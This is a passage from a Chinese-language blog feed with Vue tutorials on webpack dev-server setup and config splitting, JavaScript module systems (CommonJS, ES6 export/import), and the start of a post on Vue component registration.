webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&quot;最终版权归阿楠所有&quot;</span>),</span><br><span class="line">      <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">        <span class="attr">template</span>: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">      &#125;),</span><br><span class="line">      <span class="keyword">new</span> <span class="title function_">uglifyjsWebpackPlugin</span>()</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看打包后的bunlde.js文件，是已经被压缩过了。</p><h1 id="本地服务器"><a href="#本地服务器" class="headerlink" title="本地服务器"></a>本地服务器</h1><p>webpack提供了一个可选的本地开发服务器，这个本地服务器基于node.js搭建，内部使用express框架，可以实现我们想要的让浏览器自动刷新显示我们修改后的结果。</p><p>不过它是一个单独的模块，在webpack中使用之前需要先安装它：</p><p><code>cnpm install --save-dev webpack-dev-server@2.9.1</code></p><p>devserver也是作为webpack中的一个选项，选项本身可以设置如下属性：</p><ul><li>contentBase：为哪一个文件夹提供本地服务，默认是根文件夹，我们这里要填写.&#x2F;dist</li><li>port：端口号</li><li>inline：页面实时刷新</li><li>historyApiFallback：在SPA页面中，依赖HTML5的history模式</li></ul><p>webpack.config.js文件配置修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">    <span class="attr">inline</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以在package.json里再配置另外一个scripts，–open参数表示直接打开浏览器：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server --open&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>重新打包后可以通过<code>npm run dev</code>来实时刷新我们的修改结果。</p><h1 id="webpack的配置分离"><a href="#webpack的配置分离" class="headerlink" title="webpack的配置分离"></a>webpack的配置分离</h1><p>我们package.json里，开发时依赖和运行时依赖都有区分开来。</p><p>那我们的webpack.config.js也应如此，像我们的本地服务器只是帮助我们开发时用的，项目发布时不需要；js压缩是项目发布时需要，但开发时不需要，所以我们应进行抽离：公共配置文件，开发时配置文件，项目发布时配置文件。</p><p>合并公共配置文件和其他配置文件是通过webpack-merge这个插件进行合并。</p><p><code>cnpm install webpack-merge@4.1.5 --save-dev</code> </p><hr><p>Base.config.js是我们开发和项目发布时都需要的配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;../dist&#x27;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [&#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;style-loader&quot;</span> <span class="comment">// creates style nodes from JS strings</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;css-loader&quot;</span> <span class="comment">// translates CSS into CommonJS</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;less-loader&quot;</span> <span class="comment">// compiles Less to CSS</span></span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|gif|jpeg)$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="attr">limit</span>: <span class="number">13000</span>,</span><br><span class="line">              <span class="attr">name</span>: <span class="string">&#x27;img/[name].[hash:8].[ext]&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.js$/</span>,</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/(node_modules|bower_components)/</span>,</span><br><span class="line">        <span class="attr">use</span>: &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">          <span class="attr">options</span>: &#123;</span><br><span class="line">            <span class="attr">presets</span>: [<span class="string">&#x27;es2015&#x27;</span>]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&#x27;vue-loader&#x27;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.css&#x27;</span>,<span class="string">&#x27;.vue&#x27;</span>],</span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> webpack.<span class="title class_">BannerPlugin</span>(<span class="string">&quot;最终版权归阿楠所有&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>prod.config.js是我们项目发布时需要的，开发时不需要的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uglifyjsWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> webMerge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">&#x27;./base.config&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">webMerge</span>(baseConfig,&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_">uglifyjsWebpackPlugin</span>()</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><hr><p>dev.config.js是我们项目发布时不需要的，开发时需要的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webMerge = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">&#x27;./base.config&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">webMerge</span>(baseConfig,&#123;</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">contentBase</span>: <span class="string">&#x27;./dist&#x27;</span>,</span><br><span class="line">    <span class="attr">inline</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><hr><p>删除原本的webpack.config.js文件，在package.json中指定我们运行命令时的配置文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack --config ./build/prod.config.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server --open --config ./build/dev.config.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时应注意由于配置文件的位置改变，所以我们应改变出口的位置：  </p><p><code>path: path.resolve(__dirname, &#39;../dist&#39;),</code></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue的模块化开发</title>
      <link href="/posts/e220/"/>
      <url>/posts/e220/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要模块化"><a href="#为什么需要模块化" class="headerlink" title="为什么需要模块化"></a>为什么需要模块化</h1><h2 id="JavaScript原始功能"><a href="#JavaScript原始功能" class="headerlink" title="JavaScript原始功能"></a>JavaScript原始功能</h2><ul><li>在网页开发的早期，js制作作为一种脚本语言，做一些简单的表单验证或动画实现等，那个时候代码还是很少的。<ul><li>那个时候的代码是怎么写的呢？直接将代码写在<code>&lt;script&gt;</code>标签中即可</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215006.png"></p><ul><li>随着ajax异步请求的出现，慢慢形成了前后端的分离。客户端需要完成的事情越来越多，代码量也是与日俱增。<ul><li>为了应对代码量的剧增，我们通常会将代码组织在多个js文件中，进行维护。</li><li>但是这种维护方式，依然不能避免一些灾难性的问题。比如全局变量同名问题：</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215005.png"></p><blockquote><p>小明后来发现代码不能正常运行，去检查自己的变量，发现确实true，最后杯具发生了，小明加班到2点还是没有找到问题出在哪里。</p></blockquote><ul><li>另外，这种代码的编写方式对js文件的依赖顺序几乎是强制性的。<ul><li>但是当js文件过多，比如有几十个的时候，弄清楚它们的顺序是一件比较痛苦的事情。</li><li>而且即使你弄清楚顺序了，也不能避免上面出现的这种尴尬问题的发生。</li></ul></li></ul><h2 id="匿名函数的解决方案"><a href="#匿名函数的解决方案" class="headerlink" title="匿名函数的解决方案"></a>匿名函数的解决方案</h2><p>我们可以使用匿名函数来解决命名方面的重名问题。</p><p>在aaa.js文件中，我们使用匿名函数：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215007.png"></p><p>但是如果我们希望在main.js文件中，用到flag，应该如何处理呢？</p><p>显然，另外一个文件中不容易使用，因为flag是一个局部变量。</p><h2 id="使用模块作为出口"><a href="#使用模块作为出口" class="headerlink" title="使用模块作为出口"></a>使用模块作为出口</h2><p>我们可以使用一个模块作为出口，将需要暴露到外面的变量暴露出去。</p><p>来看下对应的代码：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215008.png"></p><p>我们做了什么事情呢？</p><ul><li>非常简单，在匿名函数内部，定义一个对象。</li><li>给对象添加各种需要暴露到外面的属性和方法(不需要暴露的直接定义即可)。</li><li>最后将这个对象返回，并且在外面使用了一个MoudleA（模块）接收。</li></ul><p>接下来，我们在man.js中怎么使用呢？</p><ul><li>我们只需要使用属于自己模块的属性和方法即可。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215009.png"></p><p>这就是模块最基础的封装，事实上模块的封装还有很多高级的话题：</p><ul><li>但是我们这里就是要认识一下为什么需要模块，以及模块的原始雏形。</li><li>幸运的是，前端模块化开发已经有了很多既有的规范，以及对应的实现方案。</li></ul><p>常见的模块化规范：<br>CommonJS、AMD、CMD，也有ES6的Modules</p><h1 id="CommonJS（了解）"><a href="#CommonJS（了解）" class="headerlink" title="CommonJS（了解）"></a>CommonJS（了解）</h1><p>模块化有两个核心：导出和导入。</p><p>CommonJS的导出：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215010.png"></p><p>CommonJS的导入（require的参数为导出模块的所在文件，后缀可省略）：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215011.png"></p><h1 id="ES6的export指令"><a href="#ES6的export指令" class="headerlink" title="ES6的export指令"></a>ES6的export指令</h1><h2 id="export基本使用"><a href="#export基本使用" class="headerlink" title="export基本使用"></a>export基本使用</h2><p>export指令用于导出变量，比如下面的代码：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215012.png"></p><p>上面的代码还有另外一种写法：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215013.png"></p><h2 id="导出函数或类"><a href="#导出函数或类" class="headerlink" title="导出函数或类"></a>导出函数或类</h2><p>上面我们主要是输出变量，也可以输出函数或者输出类。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215014.png"></p><p>上面的代码还有另外一种写法：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215015.png"></p><h2 id="export-default"><a href="#export-default" class="headerlink" title="export default"></a>export default</h2><p>某些情况下，一个模块中包含某个的功能，我们并不希望给这个功能命名，而且让导入者可以自己来命名，</p><p>这个时候就可以使用export default：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215016.png"></p><p>我们来到main.js中，这样使用就可以了：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215017.png"></p><p>这里的myFunc是自己命名的，你可以根据需要命名它对应的名字。</p><p><code>注意：export default在同一个模块中，不允许同时存在多个。</code></p><h1 id="ES6的import指令"><a href="#ES6的import指令" class="headerlink" title="ES6的import指令"></a>ES6的import指令</h1><p>我们使用export指令导出了模块对外提供的接口，下面我们就可以通过import命令来加载对应的这个模块了。</p><p>首先，我们需要在HTML代码中引入两个js文件，并且类型需要设置为module。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201031100855.png"></p><p>import指令用于导入模块中的内容，比如main.js的代码：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201031100902.png"></p><p>如果我们希望某个模块中所有的信息都导入，一个个导入显然有些麻烦：<br>通过<code>*</code>可以导入模块中所有的export变量，<br>但是通常情况下我们需要给<code>*</code>起一个别名，方便后续的使用：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201031100908.png"></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模块化 </tag>
            
            <tag> CommonJS </tag>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue的组件化开发</title>
      <link href="/posts/7098/"/>
      <url>/posts/7098/</url>
      
        <content type="html"><![CDATA[<h1 id="认识组件化"><a href="#认识组件化" class="headerlink" title="认识组件化"></a>认识组件化</h1><h2 id="什么是组件化"><a href="#什么是组件化" class="headerlink" title="什么是组件化"></a>什么是组件化</h2><ul><li>人面对复杂问题的处理方式：<ul><li>任何一个人处理信息的逻辑能力都是有限的，所以当面对一个非常复杂的问题时，我们不太可能一次性搞定它。但是我们人有一种天生的能力，就是将问题进行拆解。</li><li>如果将一个复杂的问题拆分成很多个可以处理的小问题，再将其放在整体当中，你会发现大的问题也会迎刃而解。类似分治算法。</li></ul></li><li>组件化也是类似的思想：<ul><li>如果我们将一个页面中所有的处理逻辑全部放在一起，处理起来就会变得非常复杂，而且不利于后续的管理以及扩展。</li><li>但如果我们将一个页面拆分成一个个小的功能块，每个功能块完成属于自己这部分独立的功能，那么之后整个页面的管理和维护就变得非常容易了。</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201025155124.png"></p><h2 id="Vue组件化思想"><a href="#Vue组件化思想" class="headerlink" title="Vue组件化思想"></a>Vue组件化思想</h2><p>组件化是Vue.js中的重要思想。它提供了一种抽象，让我们可以开发出一个个独立可复用的小组件来构造我们的应用。</p><p>任何的应用都会被抽象成一颗<strong>组件树</strong>。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201025155348.png"></p><p>组件化思想的应用：</p><ul><li>有了组件化的思想，我们在之后的开发中就要充分的利用它。</li><li>尽可能的将页面拆分成一个个小的、可复用的组件。</li><li>这样让我们的代码更加方便组织和管理，并且扩展性也更强。</li></ul><h1 id="组件化的实现"><a href="#组件化的实现" class="headerlink" title="组件化的实现"></a>组件化的实现</h1><h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><p>组件的使用分成三个步骤：</p><ol><li>创建组件构造器</li><li>注册组件</li><li>使用组件</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201025160121.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--3.使用组件--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1.创建组件构造器对象</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> cpnC = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>: <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;h2&gt;我是标题&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;p&gt;我是内容, 哈哈哈哈&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;p&gt;我是内容, 呵呵呵呵&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/div&gt;`</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 2.注册组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;my-cpn&#x27;</span>, cpnC)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&#x27;你好啊&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>和直接使用一个div看起来并没有什么区别。</p><p>但是我们可以设想，如果很多地方都要显示这样的信息，我们就可以直接使用<code>&lt;my-cpn&gt;&lt;/my-cpn&gt;</code>来完成。</p><h2 id="步骤解析"><a href="#步骤解析" class="headerlink" title="步骤解析"></a>步骤解析</h2><p>（一）Vue.extend()：</p><ul><li>调用Vue.extend()创建的是一个组件构造器。 </li><li>通常在创建组件构造器时，传入template代表我们自定义组件的模板。该模板就是在使用到组件的地方，要显示的HTML代码。</li><li>事实上，这种写法在Vue2.x的文档中几乎已经看不到了，它会直接使用下面我们会讲到的语法糖，但是在很多资料还是会提到这种方式，而且这种方式是学习后面方式的基础。</li></ul><p>（二）Vue.component()：</p><ul><li>调用Vue.component()是将刚才的组件构造器注册为一个组件，并且给它起一个组件的标签名称。</li><li>所以需要传递两个参数：1.注册组件的标签名 2.组件构造器</li></ul><p>（三）<strong>组件必须挂载在某个Vue实例下</strong>，否则它不会生效。</p><p>​        如下图所示，使用了三次<code>&lt;my-cpn&gt;&lt;/my-cpn&gt;</code>，而第三次其实并没有生效：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201025160745.png"></p><h1 id="全局组件和局部组件"><a href="#全局组件和局部组件" class="headerlink" title="全局组件和局部组件"></a>全局组件和局部组件</h1><p>当我们调用Vue.component()注册组件时，组件的注册是全局的，这意味着该组件可以在任意Vue实例下使用。</p><p>如果我们注册的组件是挂载在某个实例中, 那么就是一个局部组件，只能在该实例下使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span 